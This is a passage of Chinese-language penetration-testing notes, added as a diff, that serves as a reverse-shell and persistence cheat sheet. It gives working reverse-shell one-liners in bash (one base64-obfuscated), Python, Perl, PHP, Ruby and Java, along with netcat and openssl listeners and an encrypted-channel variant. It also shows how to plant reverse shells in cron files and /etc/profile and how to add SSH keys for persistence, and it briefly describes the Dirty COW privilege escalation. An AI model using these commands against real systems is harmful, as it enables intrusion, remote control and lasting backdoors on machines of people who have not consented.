+> bash -i >& /dev/tcp/192.168.10.27/4444 0>&1   #将shell环境转发到192.168.10.32的4444端口上
+> 也可以如下：
+> {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwLjI3LzQ0NDQgMD4mMSA=}|{base64,-d}|{bash,-i}
+> ```
+> 
+> 然后客户端用netcat进行接收
+> 
+> ```bash
+> nc -lvp  4444  #监听4444端口
+> ```
+> 
+> 只有拥有`/bin/bash`的用户，才能使用该命令，如apache等web用户，无法使用该命令(以下是使用菜刀连接的webshell，获取到的shell是apache 的shell)
+> 
+> 文件描述符
+> 
+> - 标准输入(stdin)：代码为0，使用`<`或`<<` 
+> - 标准输出(stdout)：代码为1，使用`>`或`>>` 
+> - 标准错误输出(stderr)：代码为2，使用`2>`或`2>>`
+> - 而通过查阅资料，发现`>&`和`&>`两者一个意思，都是将标准错误输出合并到标准输出中
+> 
+> 以下这些命令其实都可以用于linux反弹shell
+> 
+> ```bash
+> bash -i >& /dev/tcp/192.168.10.27/4444 0>&1 
+> bash -i >& /dev/tcp/192.168.10.27/4444 0<&1 
+> bash -i $> /dev/tcp/192.168.10.27/4444 0>$1 
+> bash -i $> /dev/tcp/192.168.10.27/4444 0<&1 
+> ```
+> 
+> 但是，很多时候，由于我们获取的shell并不是一个具有完整交互的shell，因此可能会在使用过程中被挂起，甚至还可能会因为我们的操作失误，例如不小心摁下了Ctrl-C，这将直接终止我们的整个shell进程，或者获得的shell类型是sh的，我们使用不习惯
+> 
+> 如果目标主机有python环境，我们在用netcat获得了反弹的shell后，可以执行下面的命令，才获得一个正常的shell(可以进行交互的shell)，可以执行passwd命令，但是vim命令还是用不了
+> 
+> ```bash
+> python -c 'import pty;pty.spawn("/bin/bash")'
+> ```
+
+加密bash反弹shell的流量
+
+> - 在vps上生成SSL证书的公钥/私钥对，执行以下命令，一路回车即可
+> ```bash
+> openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+> ```
+> - 在VPS监听反弹shell
+> ```bash
+> openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
+> ```
+> - 在目标上用openssl加密反弹shell的流量
+> ```bash
+> mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.10.136:4444 > /tmp/s;rm /tmp/s
+> ```
+
+Python反弹shell
+
+> 使用下面这条命令弹回来的shell也是不可交互的shell，即 vim 和 passwd 等命令用不了
+> 
+> ```bash
+> #利用python反弹一个bash类型的shell
+> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.25",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+> ```
+> 
+> 只有拥有 `/bin/bash` 的用户，才能使用该命令，如apache等web用户，无法使用该命令(以下是使用菜刀连接的webshell，获取到的 shell 是 apache 的shell)
+	
+其他命令反弹shell
+
+> ```
+> Perl：
+> 	perl -e 'use Socket;$i="192.168.10.13";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+> PHP：
+> 	php -r '$sock=fsockopen("192.168.10.13",8888);exec("/bin/sh -i <&3>&3 2>&3");'
+> Ruby：
+> 	ruby -rsocket -e'f=TCPSocket.open("192.168.10.13",8888).to_i;exec sprintf("/bin/sh -i <&%d>&%d 2>&%d",f,f,f)'
+> Java：
+> 	r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.10.13/8888;cat <&5 2="" |="" while="" read="" line;="" do="" \$line="">&5 >&5; done"] as String[]) p.waitFor()
+> ```
+
+写入命令到定时任务文件
+
+> 我们可以在远程主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道远程主机当前的用户名是哪个，因为我们的反弹shell命令是要写在`/var/spool/cron/`当前用户命令的文件内的，所以必须要知道远程主机当前的用户名，否则就不能生效
+> 
+> 比如，当前用户名为root，我们就要将下面内容写入到 `/var/spool/cron/root` 中(centos系列主机)
+> 
+> 比如，当前用户名为root，我们就要将下面内容写入到 `/var/spool/cron/crontabs/root` 中(debian系列主机)
+> 
+> ```bash
+> */1  *  *  *  *   /bin/bash -i>&/dev/tcp/192.168.10.11/4444 0>&1
+> #每隔一分钟，向192.168.10.27的4444号端口发送shell
+> ```
+
+写入SSH公钥 
+
+> 将公钥信息传送到远程主机的/root/.ssh/目录下，并且重命名为authorized_keys如果是其他用户，比如test，那就是`/test/.ssh/`下
+
+写入/etc/profile文件
+
+> 将以下命令写入`/etc/profile`文件中，`/etc/profile`中的内容会在用户打开bash窗口时执行
+> ```bash
+> /bin/bash -i>&/dev/tcp/192.168.10.11/4444 0>&1 &
+> ```
+
+##### <font color="yellow">脏牛提权</font>
+> 
+> 脏牛漏洞，又叫Dirty COW，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞，Linux kernel团队在2016年10月18日已经对此进行了修复
+> 
+> 漏洞范围：Linux内核 >= 2.6.22(2007年发行，到2016年10月18日才修复)
+> 
+> 简要分析：该漏洞具体为，Linux内核的内存子系统在处理写入复制(copy-on-write，COW)时产生了竞争条件(race conditio)，恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问，竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码，利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限
+
+## 0x02 服务器端应用安全
 
 
 
